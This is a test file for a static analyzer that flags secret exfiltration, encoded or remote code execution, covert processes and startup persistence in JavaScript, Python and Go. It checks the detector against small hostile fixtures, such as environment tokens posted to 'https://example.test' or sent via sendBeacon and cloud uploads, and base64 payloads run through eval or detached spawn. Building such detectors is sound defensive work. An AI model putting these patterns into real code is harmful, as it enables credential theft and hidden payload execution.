import { describe, expect, it } from 'vitest';
import {
  analyzeSpectreStructuralSignals,
  analyzeSpectreStructuralSignalsIsolated,
  type SpectreStructuralFact,
  type SpectreStructuralInputFile,
} from '../spectre-structural-signals.js';

function input(file: string, content: string, addedLines?: SpectreStructuralInputFile['addedLines']): SpectreStructuralInputFile {
  return addedLines === undefined ? { file, content } : { file, content, addedLines };
}

function kinds(facts: readonly SpectreStructuralFact[]): string[] {
  return [...new Set(facts.map(fact => fact.kind))].sort();
}

describe('Spectre structural signals', () => {
  it('resolves JavaScript imports, require destructuring, aliases, flows, and covert options', async () => {
    const source = [
      "import axios from 'axios';",
      "const { spawn: launch } = require('node:child_process');",
      'const secret = process.env.DEPLOY_TOKEN;',
      'const send = axios.post;',
      "send('https://example.test', {data: secret});",
      "const payload = Buffer.from(encoded, 'base64');",
      "launch(payload, {detached: true, stdio: 'ignore'}).unref();",
    ].join('\n');

    const result = await analyzeSpectreStructuralSignals([input('install.js', source)]);
    const file = result.files[0]!;

    expect(file.outcome).toBe('parsed');
    expect(kinds(file.facts)).toEqual(expect.arrayContaining([
      'covert-process',
      'encoded-execution',
      'network-access',
      'process-execution',
      'secret-access',
      'secret-network-flow',
    ]));
    expect(file.facts.find(fact => fact.kind === 'secret-access')).toMatchObject({ startLine: 3, endLine: 3 });
    expect(file.facts.find(fact => fact.kind === 'secret-network-flow')).toMatchObject({ startLine: 5, endLine: 5 });
    expect(file.facts.find(fact => fact.kind === 'encoded-execution')).toMatchObject({ startLine: 7, endLine: 7 });
  });

  it('supports TSX namespace and named aliases without treating JSX text as code', async () => {
    const source = [
      "import * as web from 'undici';",
      "import {runInNewContext as execute} from 'node:vm';",
      'const get = web.fetch;',
      "const view = <div>fetch(url); execute(payload)</div>;",
      'get(url);',
      'execute(payload);',
    ].join('\n');

    const file = (await analyzeSpectreStructuralSignals([input('view.tsx', source)])).files[0]!;

    expect(file.language).toBe('tsx');
    expect(file.facts.filter(fact => fact.kind === 'network-access')).toHaveLength(1);
    expect(file.facts.filter(fact => fact.kind === 'dynamic-execution')).toHaveLength(1);
    expect(file.facts.find(fact => fact.kind === 'network-access')?.startLine).toBe(5);
    expect(file.facts.find(fact => fact.kind === 'dynamic-execution')?.startLine).toBe(6);
  });

  it('ignores comments, strings, user-defined same-name APIs, and shadowed imports', async () => {
    const source = [
      "import axios from 'axios';",
      "const example = \"fetch(url); eval(payload); process.env.TOKEN\";",
      '// require("child_process").exec(payload);',
      'function fetch(value) { return value; }',
      'function eval(value) { return value; }',
      'function use(axios) { axios.post(url); }',
      'const require = loader;',
      "const child = require('child_process');",
      'child.exec(example);',
      'fetch(example);',
      'eval(example);',
    ].join('\n');

    const file = (await analyzeSpectreStructuralSignals([input('safe.ts', source)])).files[0]!;
    expect(file.facts).toEqual([]);
  });

  it('tracks Python import aliases, direct flow, encoded execution, and covert process options', async () => {
    const source = [
      'import os',
      'import requests as client',
      'import base64 as codec',
      'from subprocess import run as launch',
      "secret = os.getenv('TOKEN')",
      'send = client.post',
      'send(url, data=secret)',
      'decode = codec.b64decode',
      'payload = decode(blob)',
      'launch(payload, start_new_session=True, stdout=subprocess.DEVNULL)',
    ].join('\n');

    const file = (await analyzeSpectreStructuralSignals([input('setup.py', source)])).files[0]!;

    expect(kinds(file.facts)).toEqual(expect.arrayContaining([
      'covert-process',
      'encoded-execution',
      'network-access',
      'process-execution',
      'secret-access',
      'secret-network-flow',
    ]));
    expect(file.facts.find(fact => fact.kind === 'secret-network-flow')?.startLine).toBe(7);
    expect(file.facts.find(fact => fact.kind === 'encoded-execution')?.startLine).toBe(10);
  });

  it('tracks remote execution, startup execution, browser credentials, and hex decoding', async () => {
    const [python, go, javascript] = await Promise.all([
      analyzeSpectreStructuralSignals([input('remote.py', [
        'import requests',
        'import subprocess',
        'command = requests.get(url)',
        'subprocess.run(command)',
      ].join('\n'))]),
      analyzeSpectreStructuralSignals([input('startup.go', [
        'package p',
        'import command "os/exec"',
        'func init() { command.Command(tool) }',
      ].join('\n'))]),
      analyzeSpectreStructuralSignals([input('browser.ts', [
        "const token = localStorage.getItem('authToken');",
        'navigator.sendBeacon(url, token);',
        "const payload = Buffer.from(blob, 'hex');",
        'eval(payload);',
      ].join('\n'))]),
    ]);

    expect(kinds(python.facts)).toEqual(expect.arrayContaining(['process-execution', 'remote-execution-flow']));
    expect(kinds(go.facts)).toEqual(expect.arrayContaining(['process-execution', 'startup-persistence']));
    expect(kinds(javascript.facts)).toEqual(expect.arrayContaining(['encoded-execution', 'secret-network-flow']));
  });

  it('tracks secrets through stateful WebSocket, mail, and cloud upload sinks', async () => {
    const [javascript, npmWebSocket, python, go] = await Promise.all([
      analyzeSpectreStructuralSignals([input('upload.ts', [
        "import { S3Client, PutObjectCommand } from '@aws-sdk/client-s3';",
        'const token = process.env.DEPLOY_TOKEN;',
        'const client = new S3Client({});',
        'client.send(new PutObjectCommand({ Body: token }));',
        'const socket = new WebSocket(url);',
        'socket.send(token);',
      ].join('\n'))]),
      analyzeSpectreStructuralSignals([input('socket.ts', [
        "import Socket from 'ws';",
        'const token = process.env.DEPLOY_TOKEN;',
        'const socket = new Socket(url);',
        'socket.send(token);',
      ].join('\n'))]),
      analyzeSpectreStructuralSignals([input('mail.py', [
        'import os',
        'import smtplib',
        "token = os.getenv('DEPLOY_TOKEN')",
        'client = smtplib.SMTP(host)',
        "client.sendmail('from@example.test', 'to@example.test', token)",
      ].join('\n'))]),
      analyzeSpectreStructuralSignals([input('upload.go', [
        'package p',
        'import storage "cloud.google.com/go/storage"',
        'import "os"',
        'func upload() {',
        '  token := os.Getenv("DEPLOY_TOKEN")',
        '  client, _ := storage.NewClient(ctx)',
        '  writer := client.Bucket(bucket).Object(name).NewWriter(ctx)',
        '  writer.Write([]byte(token))',
        '}',
      ].join('\n'))]),
    ]);

    expect(javascript.facts.filter(fact => fact.kind === 'secret-network-flow').map(fact => fact.startLine)).toEqual([4, 6]);
    expect(npmWebSocket.facts.find(fact => fact.kind === 'secret-network-flow')?.startLine).toBe(4);
    expect(python.facts.find(fact => fact.kind === 'secret-network-flow')?.startLine).toBe(5);
    expect(go.facts.find(fact => fact.kind === 'secret-network-flow')?.startLine).toBe(8);
  });

  it('does not treat a deferred Go callback registered by init as startup execution', async () => {
    const file = (await analyzeSpectreStructuralSignals([input('deferred.go', [
      'package p',
      'import command "os/exec"',
      'func init() { register(func() { command.Command(tool) }) }',
    ].join('\n'))])).files[0]!;

    expect(kinds(file.facts)).toContain('process-execution');
    expect(kinds(file.facts)).not.toContain('startup-persistence');
  });

  it('honors Python shadowing and ignores API names in comments and strings', async () => {
    const source = [
      'import requests',
      'import subprocess',
      'def requests(value):',
      '    return value',
      'def safe(subprocess):',
      '    subprocess.run(value)',
      "message = 'requests.post(url); subprocess.run(x); os.environ'",
      '# eval(payload)',
      'requests(value)',
    ].join('\n');

    const file = (await analyzeSpectreStructuralSignals([input('safe.py', source)])).files[0]!;
    expect(file.facts).toEqual([]);
  });

  it('models callable scopes without shadowing imports referenced only by parameter types', async () => {
    const [javascript, python, go] = await Promise.all([
      analyzeSpectreStructuralSignals([input('scope.ts', [
        "import axios from 'axios';",
        'const arrow = (axios: typeof axios) => axios.post(url);',
        'const expression = function (axios: Client) { axios.post(url); };',
        'function typed(response: axios.Response) { axios.post(url); }',
      ].join('\n'))]),
      analyzeSpectreStructuralSignals([input('scope.py', [
        'import requests',
        'shadowed = lambda requests: requests.post(url)',
        'def typed(response: requests.Response):',
        '    return requests.post(url)',
      ].join('\n'))]),
      analyzeSpectreStructuralSignals([input('scope.go', [
        'package p',
        'import web "net/http"',
        'func (receiver service) shadowed(web Client) { web.Get(url) }',
        'var callback = func(web Client) { web.Get(url) }',
        'func typed(request *web.Request) { web.Get(url) }',
      ].join('\n'))]),
    ]);

    expect(javascript.facts.filter(fact => fact.kind === 'network-access').map(fact => fact.startLine)).toEqual([4]);
    expect(python.facts.filter(fact => fact.kind === 'network-access').map(fact => fact.startLine)).toEqual([4]);
    expect(go.facts.filter(fact => fact.kind === 'network-access').map(fact => fact.startLine)).toEqual([5]);
  });

  it('tracks JavaScript reassignment aliases and changed binding provenance', async () => {
    const reassigned = await analyzeSpectreStructuralSignals([input('reassigned.ts', [
      "import axios from 'axios';",
      'let send = safe;',
      'send = axios.post;',
      'send(url);',
    ].join('\n'))]);
    const importOnly = await analyzeSpectreStructuralSignals([input('import-only.ts', [
      "import { post as send } from 'axios';",
      'send(url);',
    ].join('\n'), [{ line: 1, content: "import { post as send } from 'axios';" }])]);

    expect(reassigned.facts.find(fact => fact.kind === 'network-access')).toMatchObject({ startLine: 4 });
    expect(importOnly.facts.find(fact => fact.kind === 'network-access')).toMatchObject({
      startLine: 2,
      intersectsAddedLine: true,
    });
  });

  it('does not erase imports on property assignment and analyzes callable defaults', async () => {
    const source = [
      "import axios, { post as send } from 'axios';",
      'axios.defaults.timeout = 100;',
      'const request = axios.post;',
      'request(url);',
      'const callback = (value = send(other)) => value;',
    ].join('\n');

    const file = (await analyzeSpectreStructuralSignals([input('defaults.ts', source)])).files[0]!;

    expect(file.facts.filter(fact => fact.kind === 'network-access').map(fact => fact.startLine)).toEqual([4, 5]);
  });

  it('preserves secret and encoded taint through bounded transparent wrappers', async () => {
    const [javascript, python, go] = await Promise.all([
      analyzeSpectreStructuralSignals([input('wrapped.js', [
        "import { post as send } from 'axios';",
        'const token = process.env.TOKEN;',
        'send(url, JSON.stringify(token));',
        "const payload = Buffer.from(blob, 'base64').toString();",
        'eval(payload);',
      ].join('\n'))]),
      analyzeSpectreStructuralSignals([input('wrapped.py', [
        'import os',
        'import requests as client',
        'client.post(url, json=dict(os.environ))',
      ].join('\n'))]),
      analyzeSpectreStructuralSignals([input('wrapped.go', [
        'package p',
        'import web "net/http"',
        'import "os"',
        'import "strings"',
        'func send() { web.Post(url, kind, strings.NewReader(os.Getenv("TOKEN"))) }',
      ].join('\n'))]),
    ]);

    expect(kinds(javascript.facts)).toEqual(expect.arrayContaining(['secret-network-flow', 'encoded-execution']));
    expect(kinds(python.facts)).toContain('secret-network-flow');
    expect(kinds(go.facts)).toContain('secret-network-flow');
  });

  it('does not preserve taint through shadowed wrapper names', async () => {
    const [javascript, python, go] = await Promise.all([
      analyzeSpectreStructuralSignals([input('shadowed.js', [
        "import { post as send } from 'axios';",
        'const JSON = { stringify: () => "redacted" };',
        'const token = process.env.TOKEN;',
        'send(url, JSON.stringify(token));',
      ].join('\n'))]),
      analyzeSpectreStructuralSignals([input('shadowed.py', [
        'import os',
        'import requests as client',
        'def dict(value): return {}',
        'client.post(url, json=dict(os.environ))',
      ].join('\n'))]),
      analyzeSpectreStructuralSignals([input('shadowed.go', [
        'package p',
        'import web "net/http"',
        'import "os"',
        'func string(value any) safe { return safe{} }',
        'func send() { web.Post(url, kind, string(os.Getenv("TOKEN"))) }',
      ].join('\n'))]),
    ]);

    expect(javascript.facts.some(fact => fact.kind === 'secret-network-flow')).toBe(false);
    expect(python.facts.some(fact => fact.kind === 'secret-network-flow')).toBe(false);
    expect(go.facts.some(fact => fact.kind === 'secret-network-flow')).toBe(false);
  });

  it('resolves Go package and assignment aliases for secret, network, encoding, and command flow', async () => {
    const source = [
      'package install',
      'import (',
      '  web "net/http"',
      '  "os"',
      '  command "os/exec"',
      '  codec "encoding/base64"',
      ')',
      'func run(url string, blob string) {',
      '  secret := os.Getenv("TOKEN")',
      '  send := web.Post',
      '  send(url, "text/plain", secret)',
      '  decode := codec.StdEncoding.DecodeString',
      '  payload := decode(blob)',
      '  launch := command.CommandContext',
      '  launch(ctx, payload)',
      '}',
    ].join('\n');

    const file = (await analyzeSpectreStructuralSignals([input('install.go', source)])).files[0]!;

    expect(kinds(file.facts)).toEqual(expect.arrayContaining([
      'encoded-execution',
      'network-access',
      'process-execution',
      'secret-access',
      'secret-network-flow',
    ]));
    expect(file.facts.find(fact => fact.kind === 'secret-network-flow')?.startLine).toBe(11);
    expect(file.facts.find(fact => fact.kind === 'encoded-execution')?.startLine).toBe(15);
  });

  it('preserves all-source, no-change, and exact added-line semantics', async () => {
    const source = [
      "import axios from 'axios';",
      'const secret = process.env.TOKEN;',
      'axios.post(url, secret);',
    ].join('\n');
    const [whole, none, sinkOnly] = await Promise.all([
      analyzeSpectreStructuralSignals([input('flow.js', source)]),
      analyzeSpectreStructuralSignals([input('flow.js', source, [])]),
      analyzeSpectreStructuralSignals([input('flow.js', source, [{ line: 3, content: 'axios.post(url, secret);' }])]),
    ]);

    expect(whole.facts.every(fact => fact.intersectsAddedLine)).toBe(true);
    expect(none.facts.every(fact => !fact.intersectsAddedLine)).toBe(true);
    expect(sinkOnly.facts.find(fact => fact.kind === 'secret-access')?.intersectsAddedLine).toBe(false);
    expect(sinkOnly.facts.find(fact => fact.kind === 'secret-network-flow')?.intersectsAddedLine).toBe(true);
  });

  it('uses bounded error recovery for malformed syntax without exposing parser diagnostics', async () => {
    const source = "import {exec} from 'child_process';\nfunction broken( {\nexec(payload);\n";
    const file = (await analyzeSpectreStructuralSignals([input('broken.js', source)], {
      limits: { maxNodesPerFile: 50 },
    })).files[0]!;

    expect(['parsed-with-errors', 'parsed']).toContain(file.outcome);
    expect(file.nodesVisited).toBeLessThanOrEqual(50);
    expect(file).not.toHaveProperty('error');
  });

  it('orders files and facts deterministically', async () => {
    const files = [
      input('z.py', 'import os\nvalue = os.getenv("TOKEN")'),
      input('a.js', 'fetch(url);\neval(payload);'),
    ];
    const first = await analyzeSpectreStructuralSignals(files);
    const second = await analyzeSpectreStructuralSignals([...files].reverse());

    expect(first.files.map(file => file.file)).toEqual(['a.js', 'z.py']);
    expect(first.facts).toEqual(second.facts);
    expect(first.facts.map(fact => `${fact.file}:${fact.startLine}:${fact.kind}`)).toEqual([
      'a.js:1:network-access',
      'a.js:2:dynamic-execution',
      'z.py:2:secret-access',
    ]);
  });

  it('enforces file, byte, fact, and traversal limits with stable outcomes', async () => {
    const fileLimited = await analyzeSpectreStructuralSignals([
      input('b.js', 'fetch(url);'),
      input('a.js', 'eval(value);'),
    ], { limits: { maxFiles: 1 } });
    expect(fileLimited.files.map(file => file.outcome)).toEqual(['parsed', 'file-limit']);

    const byteLimited = await analyzeSpectreStructuralSignals([input('large.py', 'x'.repeat(20))], {
      limits: { maxFileBytes: 10 },
    });
    expect(byteLimited.files[0]?.outcome).toBe('byte-limit');

    const factLimited = await analyzeSpectreStructuralSignals([input('many.js', 'fetch(a);\neval(b);\nfetch(c);')], {
      limits: { maxFactsPerFile: 1 },
    });
    expect(factLimited.files[0]).toMatchObject({ factsTruncated: true });
    expect(factLimited.files[0]?.facts).toHaveLength(1);

    const traversalLimited = await analyzeSpectreStructuralSignals([input('deep.go', 'package p\nfunc f(){println(1)}')], {
      limits: { maxNodesPerFile: 1 },
    });
    expect(traversalLimited.files[0]).toMatchObject({ outcome: 'budget-exceeded', budgetExceeded: true });
  });

  it('returns stable cancellation, null-content, and unsupported outcomes', async () => {
    const controller = new AbortController();
    controller.abort();
    const cancelled = await analyzeSpectreStructuralSignals([input('a.js', 'fetch(url)')], { signal: controller.signal });
    expect(cancelled).toMatchObject({ cancelled: true });
    expect(cancelled.files[0]?.outcome).toBe('cancelled');

    const other = await analyzeSpectreStructuralSignals([
      { file: 'a.py', content: null },
      input('README.md', 'fetch(url)'),
    ]);
    expect(other.files.map(file => [file.file, file.outcome])).toEqual([
      ['README.md', 'unsupported'],
      ['a.py', 'no-content'],
    ]);
  });

  it('bounds isolated worker payloads before structured cloning', async () => {
    const workerSource = [
      "import { parentPort, workerData } from 'node:worker_threads';",
      'const files = workerData.files.map(input => ({',
      "  file: input.file, language: 'javascript', outcome: 'parsed', facts: [],",
      "  bytes: Buffer.byteLength(input.content ?? '', 'utf8'), elapsedMs: 1, nodesVisited: 1,",
      '  budgetExceeded: false, factsTruncated: false,',
      '}));',
      'parentPort.postMessage({ files, facts: [], bytes: files.reduce((n, f) => n + f.bytes, 0),',
      '  elapsedMs: 1, nodesVisited: files.length, budgetExceeded: false, cancelled: false });',
    ].join('\n');
    const workerUrl = new URL(`data:text/javascript,${encodeURIComponent(workerSource)}`);

    const result = await analyzeSpectreStructuralSignalsIsolated([
      input('c.js', 'fetch(c);'),
      input('a.js', 'ok'),
      input('b.js', 'x'.repeat(20)),
    ], {
      workerUrl,
      limits: { maxFiles: 2, maxFileBytes: 10, maxTotalBytes: 10 },
    });

    expect(result.files.map(file => [file.file, file.outcome])).toEqual([
      ['a.js', 'parsed'],
      ['b.js', 'byte-limit'],
      ['c.js', 'file-limit'],
    ]);
    expect(result).toMatchObject({ bytes: 2, nodesVisited: 1, budgetExceeded: true });
  });
});
